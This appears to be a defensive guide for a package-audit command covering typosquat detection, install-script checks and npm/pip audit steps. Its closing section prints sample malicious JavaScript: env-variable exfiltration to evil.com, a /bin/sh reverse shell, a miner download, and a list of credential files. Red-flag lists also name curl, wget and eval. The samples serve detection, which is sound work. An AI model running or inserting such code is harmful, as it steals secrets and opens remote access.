# CODE SECURITY: PACKAGE AUDIT

## Purpose

Detect fake, malicious, or vulnerable packages in the project.

---

## What We Check

### 1. Typosquatting Detection

Malicious packages with names similar to popular packages:

```markdown
## Common Typosquats to Check:

| Popular Package | Typosquats to Flag |
|-----------------|-------------------|
| lodash | lodahs, lodash-es-fake, lod-ash |
| express | expres, expresss, node-express |
| react | reakt, re-act, reactjs-core |
| axios | axois, axio, axios-http |
| moment | momnet, momentjs, moment-date |
| chalk | chalks, chak, node-chalk |
| request | reqeust, node-request |
| commander | comander, commanderjs |
| debug | debgu, node-debug |
| colors | colour, colorsjs |
```

### 2. Suspicious Install Scripts

Check `package.json` for dangerous scripts:

```bash
# Grep for suspicious scripts
grep -r "postinstall\|preinstall\|prepare" package.json

# Flags to look for:
- curl or wget in scripts
- Base64 encoded content
- Obfuscated code
- Network calls during install
- File system writes outside node_modules
```

### 3. Publisher Reputation

```markdown
## Red Flags:
- Package published < 1 week ago
- Publisher has only 1 package
- < 100 weekly downloads
- No GitHub repository
- Repository doesn't match package name
- No license
- No README
```

### 4. Known Advisory Databases

```bash
# Run npm audit
npm audit

# Run yarn audit
yarn audit

# Check against:
- npm Advisory Database
- GitHub Advisory Database
- Snyk Vulnerability Database
- OSS Index
```

---

## Package Audit Process

### Step 1: List All Packages

```bash
# List direct dependencies
npm ls --depth=0

# List all dependencies (including transitive)
npm ls --all

# Check for outdated
npm outdated
```

### Step 2: Run Automated Audit

```bash
# npm
npm audit
npm audit --json > audit-report.json

# yarn
yarn audit
yarn audit --json > audit-report.json

# For Python
pip-audit
pip-audit --format json > audit-report.json
```

### Step 3: Manual Verification

For each package with:
- Few downloads
- Recent publication
- Unknown publisher

```bash
# Check package info
npm view <package-name>

# Check on npm website
# https://www.npmjs.com/package/<package-name>

# Verify:
- Publisher history
- GitHub repo exists and matches
- Has actual code (not just install scripts)
- README explains what it does
```

### Step 4: Analyze Install Scripts

```bash
# View package.json of specific package
cat node_modules/<package>/package.json | jq '.scripts'

# Look for:
- preinstall
- postinstall
- prepare
- prepublish

# Red flags in scripts:
- curl, wget
- eval()
- Buffer.from(..., 'base64')
- process.env access
- fs.writeFile outside package
```

---

## Output Format

```markdown
# PACKAGE AUDIT REPORT

## Summary
- **Total Packages**: X
- **Direct Dependencies**: X
- **Vulnerabilities Found**: X
- **Suspicious Packages**: X
- **Typosquats Detected**: X

## Critical Findings

### 🔴 Malicious Package Detected
- **Package**: [name]
- **Version**: [version]
- **Reason**: [why it's malicious]
- **Action**: REMOVE IMMEDIATELY

### 🔴 Known Vulnerability
- **Package**: [name]
- **CVE**: [CVE-XXXX-XXXXX]
- **Severity**: Critical
- **Fix**: Upgrade to [version]

## Suspicious Packages

### 🟠 Potential Typosquat
- **Package**: [name]
- **Similar To**: [popular package]
- **Action**: Verify this is the correct package

### 🟠 Low Trust Package
- **Package**: [name]
- **Downloads**: [low number]
- **Published**: [recent date]
- **Action**: Review necessity, consider alternatives

## Dependency Vulnerabilities

| Package | Vulnerability | Severity | Fix |
|---------|--------------|----------|-----|
| [name] | [CVE] | Critical | Upgrade to X |
| [name] | [CVE] | High | Upgrade to X |

## Recommendations
1. [Action 1]
2. [Action 2]
3. [Action 3]
```

---

## Commands

```bash
# Quick package audit
/sec-packages

# Detailed with output file
/sec-packages --output report.md

# Focus on specific package
/sec-packages --check <package-name>

# Include dev dependencies
/sec-packages --include-dev
```

---

## Common Malicious Patterns

### 1. Data Exfiltration
```javascript
// Sends env vars to attacker
const https = require('https');
https.get(`https://evil.com/?env=${Buffer.from(JSON.stringify(process.env)).toString('base64')}`);
```

### 2. Reverse Shell
```javascript
// Opens connection to attacker
const net = require('net');
const child = require('child_process');
const client = new net.Socket();
client.connect(PORT, HOST, function() {
    client.pipe(child.spawn('/bin/sh').stdin);
});
```

### 3. Cryptominer
```javascript
// Downloads and runs miner
const https = require('https');
const fs = require('fs');
https.get('https://evil.com/miner', res => {
    res.pipe(fs.createWriteStream('/tmp/miner'));
    // Then executes it
});
```

### 4. Credential Harvesting
```javascript
// Looks for credentials in common files
const fs = require('fs');
const files = ['.env', '.npmrc', '.aws/credentials'];
// Sends to attacker
```

---

## When to Run

- **Before every deployment**
- **After adding new dependencies**
- **Weekly scheduled scan**
- **When npm audit reports issues**
- **When onboarding new project**
